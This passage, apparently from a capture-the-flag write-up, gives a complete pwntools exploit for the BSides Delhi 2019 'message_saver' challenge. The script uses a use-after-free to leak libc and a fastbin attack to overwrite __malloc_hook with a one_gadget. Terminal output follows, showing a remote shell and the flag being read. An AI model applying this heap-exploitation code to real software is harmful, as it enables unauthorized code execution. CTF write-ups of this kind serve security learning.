<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="final-exploit"><strong>Final Exploit</strong></h3>

<p>Note that for some reason, the exploit isn‚Äôt 100% reliable. I can‚Äôt seem to figure out why, but I had to run it a couple times on the remote server before it gave me a shell. At the end of the day though, it works.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./message_saver'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'35.226.111.216'</span><span class="p">,</span> <span class="mi">4444</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.23.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_base_address</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
	<span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/proc/{}/maps"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pid</span><span class="p">),</span> <span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_base_address</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">topic</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'topic</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">topic</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'body</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">))</span> <span class="c1"># +2 due to application logic stuff
</span>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'body</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">topic</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'topic</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">topic</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'body</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

    <span class="n">content</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Message viewing'</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">content</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([])</span>

<span class="c1"># Exploit goes here
</span>
<span class="c1"># Set up initial chunks
</span><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Small sized chunk, goes into unsorted bin for libc leak
</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x66</span><span class="p">)</span> <span class="c1"># Used for fastbin attack
</span><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x66</span><span class="p">)</span> <span class="c1"># Used for fastbin attack
</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">'D'</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="s">'D'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># Prevents coalesce with the top chunk
</span>
<span class="c1"># Free the small sized chunk and use the UAF to read the libc address from it
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' : '</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Calculate offsets
</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="mh">0xd</span>
<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf02a4</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__malloc_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'one_gadget: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

<span class="c1"># Fastbin attack time. Free chunks B and C
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1"># We must have a valid pointer at the fd of the topic chunk, otherwise the program will crash
# So we initially read the fd pointer of chunk C's topic and store it
</span><span class="n">topic_fd</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' : '</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Now overwrite the fd pointer of chunk C's body to __malloc_hook-0x30+0xd
# Ensure not to change chunk C's topic's fd pointer
</span><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">topic_fd</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>

<span class="c1"># Second allocation will be at __malloc_hook-0x30+0xd
# Overwrite __malloc_hook with one_gadget
</span><span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0x66</span><span class="p">)</span> <span class="c1"># Chunk C given back to us
</span><span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0x4b</span><span class="p">)</span> <span class="c1"># Chunk on __malloc_hook - 0x30 + 0xd
</span>
<span class="c1"># Get shell
</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-xenial:/ctf/pwn-and-rev/bsides_delhi2019/message_saver<span class="nv">$ </span>./exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/bsides_delhi2019/message_saver/message_saver'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/bsides_delhi2019/message_saver/libc-2.23.so'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+] Opening connection to 35.226.111.216 on port 4444: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc leak: 0x7f8fca9d0b78
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f8fca60c000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> __malloc_hook: 0x7f8fca9d0aed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> one_gadget: 0x7f8fca6fc2a4
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="nv">$ </span><span class="nb">ls
</span>chall
flag
run.sh
<span class="nv">$ </span><span class="nb">cat </span>flag
bsides_delhi<span class="o">{</span>u4f_1s_d4ng3r0us_4ft3r_4ll!!<span class="o">}</span>
<span class="nv">$ </span> 
</code></pre></div></div>
:ET